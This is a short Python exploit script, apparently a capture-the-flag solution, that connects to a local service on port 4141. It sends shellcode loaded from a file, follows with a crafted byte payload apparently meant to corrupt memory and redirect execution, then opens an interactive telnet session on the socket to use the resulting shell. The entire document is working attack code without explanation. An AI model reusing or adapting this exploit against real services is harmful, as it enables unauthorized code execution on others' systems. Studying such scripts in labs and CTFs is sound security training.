#!/usr/bin/python

import socket
import telnetlib

s = socket.create_connection(('localhost', 4141))
f = s.makefile('rw', bufsize=0)

def readuntil(f, s):
    data = ''
    while s not in data:
        data += f.read(1)
    return data

shellcode = open('shellcode.bin', 'rb').read()

f.write('1' + shellcode + '\n')

payload  = '\x98' * 24
payload += '\xa0'
payload += '\xa1' * 0xff

f.write(payload + '\n')

readuntil(f, '}:0\t')

t = telnetlib.Telnet()
t.sock = s
t.interact()
